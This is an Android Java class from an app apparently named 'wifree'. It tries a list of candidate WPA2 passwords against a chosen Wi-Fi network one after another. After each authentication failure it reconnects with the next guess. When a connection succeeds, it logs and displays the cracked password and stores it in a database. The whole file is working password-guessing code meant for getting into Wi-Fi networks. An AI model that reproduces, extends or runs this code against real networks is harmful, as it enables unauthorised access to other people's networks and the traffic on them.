package com.github.markszabo.wifree;


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.wifi.SupplicantState;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.util.Log;
import android.widget.TextView;

import java.util.ArrayList;
import java.util.List;

public class ConnectToWifi {
    private Context context;
    private WifiNetwork network;
    private int pskid;
    private boolean mStateChangedReceiverRegistered;
    private TextView status;

    private WifiManager mWifiManager;

    ConnectToWifi(Context context, WifiNetwork network, TextView status) {
        this.context = context;
        this.network = network;
        this.status = status;
        this.mWifiManager = (WifiManager) this.context.getSystemService(this.context.WIFI_SERVICE);
        mStateChangedReceiverRegistered = false;
    }

    private final BroadcastReceiver mStateChangedReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context c, Intent intent) {
            if (intent.getAction().equals(WifiManager.SUPPLICANT_STATE_CHANGED_ACTION)) {
                SupplicantState supl_state= intent.getParcelableExtra(WifiManager.EXTRA_NEW_STATE);
                switch(supl_state){
                    case COMPLETED:
                        Log.i("", "Connected, the password is " + network.possiblePasswords.get(pskid));
                        status.setText("Password: " + network.possiblePasswords.get(pskid));
                        //save password to database
                        CrackList.updateListInDb(context, network.BSSID, WifiNetwork.CRACK_FINISHED, network.possiblePasswords.get(pskid));
                        end();
                        break;
                    default:
                        break;

                }
                int supl_error=intent.getIntExtra(WifiManager.EXTRA_SUPPLICANT_ERROR, -1);
                if(supl_error == WifiManager.ERROR_AUTHENTICATING){
                    status.setText("Testing: " + (pskid+1) + "/" + network.possiblePasswords.size() + " password");
                    Log.i("", "Incorrect password('" + network.possiblePasswords.get(pskid) + "'), trying next one.");
                    connectToNext();
                }
            }
        }
    };

    public void connectToNext() {
        pskid++;
        if(network.possiblePasswords.size() > pskid) {
            Log.d("connectToNext", "about to connect to " + network.SSID + " using password " + network.possiblePasswords.get(pskid));
            String psk = network.possiblePasswords.get(pskid);
            if(psk.length() >= 8) { //WPA2 must have at least 8 char passwords
                WifiConfiguration wifiConfig = new WifiConfiguration();
                wifiConfig.SSID = String.format("\"%s\"", network.SSID);
                wifiConfig.preSharedKey = String.format("\"%s\"", psk);

                //remember id
                int netId = mWifiManager.addNetwork(wifiConfig);
                mWifiManager.disconnect();
                mWifiManager.enableNetwork(netId, true);
                mWifiManager.reconnect();
            } else {
                connectToNext();
            }
        }
    }

    public void start() {
        if(!mStateChangedReceiverRegistered) {
            this.context.registerReceiver(mStateChangedReceiver, new IntentFilter(WifiManager.SUPPLICANT_STATE_CHANGED_ACTION));
            mStateChangedReceiverRegistered = true;
        }
        this.pskid = -1;

        connectToNext();
    }

    public void end() {
        if(mStateChangedReceiverRegistered) {
            context.unregisterReceiver(mStateChangedReceiver);
        }
    }
}
